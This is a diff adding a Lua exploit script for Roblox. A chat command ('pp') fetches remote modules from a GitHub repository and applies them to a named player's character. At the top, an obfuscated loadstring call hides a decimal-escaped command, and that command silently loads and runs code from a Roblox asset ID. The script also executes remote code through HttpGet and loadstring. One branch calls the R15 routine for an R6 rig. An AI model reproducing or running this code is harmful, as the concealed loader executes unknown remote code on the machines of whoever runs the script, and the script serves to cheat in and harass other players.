@@ -1,0 +1,45 @@
+net = true
+notify = true
+
+spawn(function()
+    loadstring("\13\10\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\71\101\116\79\98\106\101\99\116\115\40\34\114\98\120\97\115\115\101\116\105\100\58\47\47\55\50\53\55\55\54\49\55\56\53\34\41\91\49\93\46\83\111\117\114\99\101\41\40\41\13\10")()
+end)
+local plr = game.Players.LocalPlayer
+local Players = game:GetService("Players")
+function GetPlayer(v)
+	for i,Aplr in pairs(Players:GetPlayers()) do
+		if string.find(string.lower(Aplr.Name),string.lower(v)) ~= nil then
+			return Aplr
+		elseif string.find(string.lower(Aplr.DisplayName),string.lower(v)) ~= nil then
+			return Aplr
+		end
+
+	end
+end
+plr.Chatted:Connect(function(msg)
+	local FinalMsg =string.split(string.split(string.gsub(msg,';',''))[1],' ')
+	if FinalMsg[1] == "pp" then
+		if FinalMsg[2] then
+			local plr = GetPlayer(FinalMsg[2])
+			if tonumber(FinalMsg[3]) == 1 then
+				if plr.Character:FindFirstChildOfClass("Humanoid").RigType == Enum.HumanoidRigType.R6 then
+                    local m = loadstring(game:HttpGet("https://raw.githubusercontent.com/x203f/FeSussyPart/main/Modules/Small",true))()
+                    m:R6(plr)
+				elseif plr.Character:FindFirstChildOfClass("Humanoid").RigType == Enum.HumanoidRigType.R15 then
+                    local m = loadstring(game:HttpGet("https://raw.githubusercontent.com/x203f/FeSussyPart/main/Modules/Small",true))()
+                    m:R15(plr)
+				end
+
+			elseif tonumber(FinalMsg[3]) == 2 then
+				if plr.Character:FindFirstChildOfClass("Humanoid").RigType == Enum.HumanoidRigType.R6 then
+                    local m = loadstring(game:HttpGet("https://raw.githubusercontent.com/x203f/FeSussyPart/main/Modules/Medium",true))()
+                    m:R15(plr)
+				elseif plr.Character:FindFirstChildOfClass("Humanoid").RigType == Enum.HumanoidRigType.R15 then
+                    local m = loadstring(game:HttpGet("https://raw.githubusercontent.com/x203f/FeSussyPart/main/Modules/Medium",true))()
+                    m:R15(plr)
+				end
+
+			end
+		end
+	end
+end)
